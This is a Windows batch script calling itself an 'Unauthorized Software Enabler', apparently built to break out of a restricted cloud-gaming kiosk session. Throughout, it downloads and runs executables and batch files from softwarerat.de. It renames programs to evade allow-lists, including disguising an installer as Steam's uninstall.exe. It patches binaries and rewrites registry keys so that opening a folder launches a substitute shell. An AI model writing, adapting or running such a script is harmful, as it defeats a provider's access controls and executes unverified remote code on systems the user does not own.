@ECHO OFF
color 47
cls
B:
md DontSaveHereDirectly
cd DontSaveHereDirectly
%HOMEDRIVE%
cd %HOMEPATH%
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/gfnx_tmgay/RobloxInstaller.bat
cd %localappdata%
md MEGAsync
md Downloads
md WinRAR
md 8-Zip
md Notepad++
md Expsoska
md ProcessExplorer
cd "\Program Files (x86)\Steam"
title Unauthorized Software Enabler by SoftwareRat - Version 3.0
color 47
ren uninstall.exe uninstall.exe.bak
cls
echo 7-Zip will be installed...
cd %localappdata%\8-Zip
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/8z/7-zip.dll
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/8z/7-zip32.dll
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/8z/7z.dll
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/8z/8zFM.exe
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/8z/8zG.exe
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/8z/8z.exe
C:\PerfLogs\fixer.exe %localappdata%\8-Zip\8z.exe
C:\PerfLogs\fixer.exe %localappdata%\8-Zip\8zFM.exe
C:\PerfLogs\fixer.exe %localappdata%\8-Zip\8zG.exe
color 47
echo 7-Zip installed!
cd "\Program Files (x86)\Steam"
del uninstall.exe
cls
color 47
:FIREFOX:
C:\PerfLogs\working.exe -LJO "https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US"
ren "_product=firefox-latest-ssl&os=win64&lang=en-US" firefoxcrash.exe
%localappdata%\8-Zip\8z.exe x firefoxcrash.exe
del firefoxcrash.exe
ren setup.exe uninstall.exe
color 47
cls
echo Firefox will be installed...
C:\PerfLogs\fixer.exe "C:\Program Files (x86)\Steam\uninstall.exe"
uninstall.exe /InstallDirectoryPath=%localappdata%\Firefox
rmdir /q /s core
ren %localappdata%\Firefox\firefox.exe icefox.exe
color 47
cls
echo Firefox installed!
del uninstall.exe
del firefoxcrash.exe
color 47
cls
:ChangeDownload:
echo Change some things for WinXShell
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /f /v {374DE290-123F-4565-9164-39C4925E467B} /t REG_EXPAND_SZ /d C:\Users\kiosk\AppData\Local\Downloads
REG ADD "HKEY_CLASSES_ROOT\Folder\shell\open\command" /f /ve /t REG_EXPAND_SZ /d C:\users\kiosk\AppData\Local\Taskbar\bin\shell\dora.exe
:Notepad:
cd %localappdata%\Notepad++
C:\PerfLogs\working.exe -LJO https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v7.8.6/npp.7.8.6.bin.x64.7z
%localappdata%\8-Zip\8z.exe x npp.7.8.6.bin.x64.7z
ren notepad++.exe noteblyat++.exe
C:\PerfLogs\fixer.exe %localappdata%\Notepad++\noteblyat++.exe
del npp.7.8.6.bin.x64.7z
cd "\Program Files (x86)\Steam"
:Taskmanager:
cd %localappdata%\ProcessExplorer
C:\PerfLogs\working.exe -O https://download.sysinternals.com/files/ProcessExplorer.zip
%localappdata%\8-Zip\8z.exe e ProcessExplorer.zip
del ProcessExplorer.zip
:qBittorrent:
cd %localappdata%
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/AATC.7z
%localappdata%\8-Zip\8z.exe x AATC.7z
del AATC.7z
:MEGAsync:
cd %localappdata%\MEGAsync
C:\PerfLogs\working.exe -O mega.nz/MEGAsyncSetup.exe
%localappdata%\8-Zip\8z.exe x %localappdata%\MEGAsync\MEGAsyncSetup.exe -x!$R0
del MEGAsyncSetup.exe
:Expsoska:
cd %localappdata%\Expsoska
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/Recplorer++.exe
:ChangeAssoc:
cd %HOMEPATH%
md FileAssoc
cd FileAssoc
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/ChangeFileAssoc.7z
%localappdata%\8-Zip\8z.exe e ChangeFileAssoc.7z
reg import 7z1.reg
reg import 7z2.reg
reg import 0011.reg
reg import 0012.reg
reg import HTTP.reg
reg import HTTPS.reg
reg import ISO1.reg
reg import ISO2.reg
reg import RAR1.reg
reg import RAR2.reg
reg import TXT.reg
reg import ZIP1.reg
reg import ZIP2.reg
cd ..
rmdir /q /s FileAssoc
C:\PerfLogs\fixer.exe %localappdata%\Expsoska\Expsoska.exe
:Taskbar:
cd %localappdata%
C:\PerfLogs\working.exe -O https://downloads.softwarerat.de/gfnx_tmgay/Taskbar.7z
cls
echo Shell will be installed...
%localappdata%\8-Zip\8z.exe x %localappdata%\Taskbar.7z
cd Taskbar
start start.bat
cls
echo Shell installed!
del %localappdata%\Taskbar.7z
C:\PerfLogs\fixer.exe %localappdata%\Firefox\icefox.exe
ren uninstall.exe.bak uninstall.exe
cd %HOMEPATH%
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/RestoreFirefoxData.bat
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/SaveFirefoxData.bat
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/SaveLocation.bat
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/RestartWinXShell.bat
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/OpenFolderWithWinXShell.bat

if exist "C:\Program Files (x86)\Steam\music\_database\fire.db" ( 
 start RestoreFirefoxData.bat
) else (
 start %localappdata%\Firefox\icefox.exe
)
if exist "C:\Program Files (x86)\Steam\music\_database\savefolder.db" ( 
 GOTO RestoreLocation
) else (
 GOTO NoSaves
)

:RestoreLocation:
echo Save detected! Files will be restored...
B:
copy "C:\Program Files (x86)\Steam\music\_database\savefolder.db"
%localappdata%\WinRAR\nvidiaraper.exe x savefolder.db
exit

:NoSaves:
echo No Saves detected! Making a new folder...
B:
md SaveHere
cd SaveHere
C:\PerfLogs\working.exe -O http://downloads.softwarerat.de/readme.html
exit